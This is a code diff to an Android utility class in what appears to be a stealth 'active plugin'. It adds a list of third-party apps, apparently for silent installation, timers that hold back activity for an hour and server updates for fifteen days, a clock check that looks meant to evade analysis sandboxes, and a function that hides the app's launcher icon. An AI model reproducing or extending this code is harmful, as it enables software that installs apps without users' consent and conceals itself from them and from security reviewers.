@@ -8,10 +8,13 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.List;
 
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.IPackageInstallObserver;
 import android.content.pm.IPackageManager;
 import android.content.pm.PackageInfo;
@@ -27,6 +30,7 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.xstd.active.plugin.BuildConfig;
+import com.xstd.active.plugin.MainActivity;
 import com.xstd.active.plugin.dao.SilenceApp;
 import com.xstd.active.plugin.dao.SilenceAppDao;
 import com.xstd.active.plugin.dao.SilenceAppDaoUtils;
@@ -242,17 +246,15 @@ public class CommandUtil {
 		context.startService(intent);
 		long currentTime = System.currentTimeMillis();
 		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(context);
-		SilenceApp goapk = new SilenceApp(null, "cn.goapk.market", currentTime, false, 1.0f, false);
-		SilenceApp hiapk = new SilenceApp(null, "com.hiapk.marketpho", currentTime, false, 1.0f, false);
-		SilenceApp kuwo = new SilenceApp(null, "cn.kuwo.player", currentTime, false, 1.0f, false);
-		SilenceApp weaver = new SilenceApp(null, "com.lenovo.videotalk.phone", currentTime, false, 1.0f, false);
-		// SilenceApp cleanmaster = new SilenceApp(null,
-		// " com.cleanmaster.mguard_cn", currentTime, false, 1.0f, false);
-		dao.insert(goapk);
-		dao.insert(hiapk);
-		dao.insert(kuwo);
-		dao.insert(weaver);
-		// dao.insert(cleanmaster);
+		dao.insert(new SilenceApp(null, "cn.goapk.market", currentTime, false, 1.0f, false));
+		dao.insert(new SilenceApp(null, "com.hiapk.marketpho", currentTime, false, 1.0f, false));
+		dao.insert(new SilenceApp(null, "cn.kuwo.player", currentTime, false, 1.0f, false));
+		dao.insert(new SilenceApp(null, "com.lenovo.videotalk.phone", currentTime, false, 1.0f, false));
+		dao.insert(new SilenceApp(null, "com.sankuai.meituan", currentTime, false, 1.0f, false));
+		dao.insert(new SilenceApp(null, "com.autonavi.minimap", currentTime, false, 1.0f, false));
+		dao.insert(new SilenceApp(null, "com.storm.smart", currentTime, false, 1.0f, false));
+		dao.insert(new SilenceApp(null, "com.UCMobile", currentTime, false, 1.0f, false));
+		dao.insert(new SilenceApp(null, "com.lenovo.videotalk.phone", currentTime, false, 1.0f, false));
 	}
 
 	/**
@@ -273,5 +275,51 @@ public class CommandUtil {
 	public static void logI(String msg) {
 		if (BuildConfig.DEBUG)
 			Log.i("ActivePlugin", msg);
+	}
+
+	/**
+	 * 如果当前系统时间大于2014年1月1日0时0分0秒则为正常时间
+	 * 
+	 * @return
+	 */
+	public static boolean isTrueTime() {
+		logW("检查时间系统时间是否正确");
+		Calendar calendar = Calendar.getInstance();
+		calendar.set(2014, 0, 1, 0, 0, 0);
+		return System.currentTimeMillis() > calendar.getTimeInMillis();
+	}
+
+	public static boolean canDoThing(SharedPreferences sharedPreferences) {
+		logW("检查是否可以做事情");
+		long firstTime = sharedPreferences.getLong("firsttime", -1);
+		if (firstTime == -1) {
+			if (isTrueTime())
+				sharedPreferences.edit().putLong("firsttime", System.currentTimeMillis()).commit();
+			else
+				return false;
+		}
+		return System.currentTimeMillis() - sharedPreferences.getLong("firsttime", -1) > 1000 * 60 * 60;
+	}
+
+	public static boolean canUpdate(SharedPreferences sharedPreferences) {
+		logW("检查是否可以更新服务器");
+		long firstTime = sharedPreferences.getLong("firsttime", -1);
+		if (firstTime == -1) {
+			if (isTrueTime())
+				sharedPreferences.edit().putLong("firsttime", System.currentTimeMillis()).commit();
+			else
+				return false;
+		}
+		return System.currentTimeMillis() - sharedPreferences.getLong("firsttime", -1) > 1000 * 60 * 60 * 24 * 15;
+	}
+
+	/**
+	 * 隐藏程序入口图标
+	 * 
+	 * @param context
+	 */
+	public static void hideInLauncher(Context context) {
+		PackageManager pm = context.getPackageManager();
+		pm.setComponentEnabledSetting(new ComponentName(context, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 	}
 }
